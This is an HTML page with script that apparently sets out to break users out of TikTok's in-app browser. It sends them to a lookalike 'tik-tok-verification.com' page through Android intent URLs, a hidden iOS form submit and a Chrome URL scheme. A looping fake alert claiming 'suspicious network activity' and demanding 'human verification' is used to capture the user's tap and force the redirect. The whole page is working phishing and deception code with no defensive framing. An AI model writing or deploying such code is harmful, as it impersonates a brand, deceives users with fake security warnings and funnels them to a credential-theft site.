<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<form id="breakoutForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_blank" style="display:none;">
</form>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    // Stripping protocol for the Chrome scheme to prevent "Google Searching"
    const domainPath = targetUrl.replace(/^https?:\/\//, '');
    
    // FAIL-SAFE: Reduced to 5 seconds as requested
    const killTime = Date.now() + 5000;

    function forceEject() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: The Intent is King.
            window.location.href = `intent://${domainPath}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: The Form-Post Injection
            // 1. Submit the form to target="_blank". 
            // TikTok often hands "_blank" requests to Safari.
            document.getElementById("breakoutForm").submit();
            
            // 2. Parallel Fire: Correctly formatted Chrome Scheme
            // "googlechromes://" + "domain.com" (No extra https in the middle)
            // This prevents it from being treated as a search query.
            setTimeout(() => {
                window.location.href = "googlechromes://" + domainPath;
            }, 50);
        }
    }

    function securityLoop() {
        // Stop everything if the fail-safe time is reached
        if (Date.now() > killTime) return;

        // 1. Try to eject immediately
        forceEject();

        // 2. Check Focus (Fast check)
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                // 3. The Lock
                alert(header + body);

                // 4. Fire on "OK" (User Gesture Token)
                forceEject();

                // Recurse
                setTimeout(securityLoop, 200);
            }
        }, 200);
    }

    window.onload = securityLoop;
</script>

</body>
</html>
